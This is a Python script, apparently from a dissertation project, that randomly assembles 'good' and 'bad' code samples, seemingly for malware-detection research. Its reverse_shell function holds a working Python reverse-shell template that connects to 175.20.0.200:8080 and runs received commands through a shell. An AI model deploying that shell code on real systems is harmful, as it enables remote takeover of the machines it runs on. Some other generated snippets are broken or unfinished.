###############################################################################
### Dissertation Sample Generator                                           ###
### Written by: Adam Barns                                                  ###
###                                                                         ###
### info: Throughout this program the list variable 'choices' is used       ###
### purposely to show where the final list is being traced through the      ###
### code.                                                                   ###
###                                                                         ###
### Function usage:                                                         ###
### decorator unpacker: <- type(2D array) -> returns(type(str))             ###
### combinor: <- list of lists to concatinate -> concatinated type(list)    ###     
###############################################################################
import random
import types
import ast, re

gene_sequence = []
place = 'placeholders' 
holders = 'for decorator' 
workaround = 'arguments hack'

def unpacker(func, *args, **kwargs):
    '''takes in a function that contains a list/s (up to a 2D aaray) 
    and then processes the list/s into a return string. Intended to 
    be used as a decorator.
    '''
    # try:
    # print(f"This is the call: {func}\n\tArgs calls: {args}\n\tKwargs calls: {kwargs}")
    if args or kwargs:
        # print(f"We're inside the callable feature!!")
        def func_wrap(func):
            # print("inside func_wrap")
            def wrapper(*args, **kwargs):
                # print("I am inside wrapper")
                choices = func(*args, **kwargs)
                # print("I am leaving wrapper")
                return(choices)
            return(wrapper)
        return(func_wrap)
    else:
        choices = func()
    # except:
    #     print("Something went wrong in the wrapper!!")  
    try:           
        global gene_sequence
        return_string = ''
        gene_array = []
        
        for i in choices:
            if type(i) is list:
                var = int(random.randrange(len(i)) )
                return_string = return_string + str(i[var])
                gene_array.append(var)
            elif type(i) is str:
                return_string += i
        gene_sequence.append(gene_array)
        if gene_array is not None:
            return(return_string)
        else:
            return(return_string)
    except:
        print("Something went wrong in the unpacker!!")


def unpacker2(*args, **kwargs):
    '''takes in a function that contains a list/s (up to a 2D aaray) 
    and then processes the list/s into a return string. Intended to 
    be used as a decorator.
    '''
    # try:
    print(f"This is the call: {args}\nKwargs calls: {kwargs}")
    if args[1]:
        # print(f"We're inside the callable feature!!")
        def func_wrap(func):
            # print("inside func_wrap")
            def wrapper(*args, **kwargs):
                # print("I am inside wrapper")
                choices = func(*args, **kwargs)
                # print("I am leaving wrapper")
                return(choices)
            return(wrapper)
        return(func_wrap)
    else:
        choices = args()
    # except:
    #     print("Something went wrong in the wrapper!!")  
    try:           
        global gene_sequence
        return_string = ''
        gene_array = []
        
        for i in choices:
            if type(i) is list:
                var = int(random.randrange(len(i)) )
                return_string = return_string + str(i[var])
                gene_array.append(var)
            elif type(i) is str:
                return_string += i
        gene_sequence.append(gene_array)
        if gene_array is not None:
            return(return_string)
        else:
            return(return_string)
    except:
        print("Something went wrong in the unpacker!!")


def combiner(*args:list) -> list:
    '''built to take in lists as args and concatinates them
    together to create a long list. Typically to be passed 
    to the unpacker to create a long string to create a file
    from. 
    args: <- type(list)
    choices: -> echoed throughout the code -> type(list)
    '''
    choices = []
    for i in args:
        if type(i) is callable:
            choices + [i()]
        elif type(i) is str:
            choices += [i]
        else:
            choices.extend(i)
    # print(f"Choices return: {choices}")
    return(choices)


## TODO this does nothing
def randomiser():
    pass 


## TODO this does nothing
def logical_equivilance_engine():
    pass 


def random_good_imports():
    choices = [
        "import math",
        "import readline",
        "import re",
        "import difflib",
        "import textwrap",
        "import stringprep",
        "import datetime",
        "import array"
    ]
    r = random.randint(1, len(choices))
    return(random.sample(choices, k=r))


def random_bad_imports():
    choices = [
        "import zlib",
        "import gzip",
        "import bz2",
        "import lzma",
        "import zipfile",
        "import tarfile",
        "import hashlib",
        "import hmac",
        "import threading",
        "import crypt", 
    ]
    r = random.randint(1, len(choices))
    return(random.sample(choices, k=r))


## TODO this does nothing
def imports (good_bad_choice, requirements):
    for i in requirements:
        choices = requirements[i]
    return(choices)    


@unpacker
def infinite_loops():
    choices = [
        'while 1:\n',
        'for i in range(100000):\n',
        'while not False:\n',
        'while True:\n',
        'while 1 == 1:\n',
        'while 1 != 2:\n',
        'while True != False:\n',
        'while False != True:\n',
        'while 1 != False:\n',
        'while 0 != True:\n',
        'while type("foo") is not int:\n',
        'while type(1) is not str:\n'
    ]
    # choices = [random.choice(choices)]  ## random.choice moved to unpacker
    return([choices])


@unpacker(place, holders, workaround)
def non_infinite_loops(passed, count = 1, upperlimit = 6) -> list:
    """ Takes in a list and two integers, then creates a list edited 
    with these positional arguments. 
    """
    assert(count < upperlimit), "upper limit is lower than counter!!" 
    count = int(count)
    upperlimit = int(upperlimit)
    choices = [
        f"count = {count}\n",
        [
            f'while {count} < {upperlimit}:\n',
            f'for i in range({upperlimit}):\n',
            f'while {upperlimit} > {count}:\n',
            f'while {count} == True && {count} < {upperlimit}:\n',
            f'while {count} is True && {count} < {upperlimit}:\n'
        ],
        f"{''.join(str(i)for i in passed)}",
        [
            '\tcount ++',
            '\tcount += 1',
            '\tcount -= -1',
            '\tcount = count + 1',
            '\tcount = count - -1',
            '\tcount = count - (2 - 3)',
            '\tcount = count + (3 - 2)'
        ]
    ]
    # print(choices)
    return(choices)
    # else: 
    #     print("non-integer values were passes to non_infinite_loops variable")


@unpacker
def reverse_shell():
    required_imports = ['import socket\n', 'import subprocess\n']
    required_components = [
        's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n',
        's.connect(("175.20.0.200",8080))\n'
        ]
    required_nests = [
        '\tcommand = s.recv(1024).decode("utf-8")\n',
        '\tif not command: break\n',
        '\tdata = subprocess.check_output(command, shell=True)\n',
        '\ts.send(data)\n'
    ]
    choices = combiner(
        required_imports, 
        required_components,
        infinite_loops,
        required_nests
        )
    return(choices)


if __name__ == "__main__":    
    ### global variables necessary for __main__ namespace.
    SAMPLE_SIZE = 1
    good_or_bad = ["good", "bad"]
    
    ### initially make a choice between making a good or bad file
    ### for the virus construction.
    for i in good_or_bad: 
        for j in range(SAMPLE_SIZE):
            if i == "good":
                good_payloads = []  ## good payload choices.
                #good_choices = random.choice(good_payloads)
            elif i == "bad":
                bad_payloads = [reverse_shell, ]  ## bad payload choices.
                bad_choices = random.choice(bad_payloads)
            else: 
                print("error: there is a problem with initialisation")


    ### now we've made a payload choice, construct the file based
    ### on the outcome of the choice. 




    ### TEST PRINTS AND VARIABLES ###
    # list1 = [1, 2, 3, 4, 5]
    # list2 = ['funcky', 'b', 'c', 'd'] 
    # x = infinite_loops()
    # print(x)
    # reverseShell()
    # print(reverse_shell)
    # print(random_good_imports())
    # print(random_bad_imports())
    # print(1 + True)
    # try:
    #     # @decoratorFunctionWithArguments(1, 6)
    #     @unpacker(1, 6)
    #     def multiply_some_shit(*args):
    #     # def multiply_some_shit(arg1, arg2):
    #         print(f"what is this witchcraft? {args}")
    #         temp = 1
    #         for i in args:
    #             temp *= i
    #         print(f"temp to be returned: {temp}")
    #         return(temp)
    # except:
    #     print("multiplyer broke")
    
    
    # try:
    # @unpacker(place, holders)
    # def foo(*args, **kwargs):
    #     # arguments = args
    #     # print(f"printing foo's arguments: {arguments}")
    #     if args:
    #         # count = arguments.count()
    #         # print(count)
    #         for i in args:
    #             a, b = args   
    #         print(f"Foo's 'a' arg variable: {a}")
    #         print(f"Foo's 'b' arg variable: {b}") 
    #     else:
    #         a = 1
    #         b = 6
    #         print(f"Foo's 'a' else variable: {a}")
    #         print(f"Foo's 'b' else variable: {b}")
    #     list3 = [
    #         f"while {a}:\n",
    #             [
    #                 f'''while {a} < {b}:\n''',
    #                 f'''for i in range({b}):\n''',
    #                 f'''while {a} > {b}:\n''',
    #                 f'''while {a} == True && {a} < {b}:\n''',
    #                 f'''while {a} is True && {a} < {b}:\n''',
    #             ]
    #         ]
    #     # print(list3)
    #     return(list3)
    
    # except TypeError:
    #     print("TypeError: 'str' object is not callable")
    # except:
    #     print("foo's strings can't do that")

    @unpacker
    def bar():
        # var = multiply_some_shit(10, 50)
        # var = foo(10, 20)
        string = [
            '\tprint("I\'m a winner!!")\n',
            '\tprint("I hope this works")\n'
        ]
        var = non_infinite_loops(string, 1, 10)
        # print(f"this is stored at var: {var}")
        return(var)

    # # print(foo(50, 100))
    print(bar)
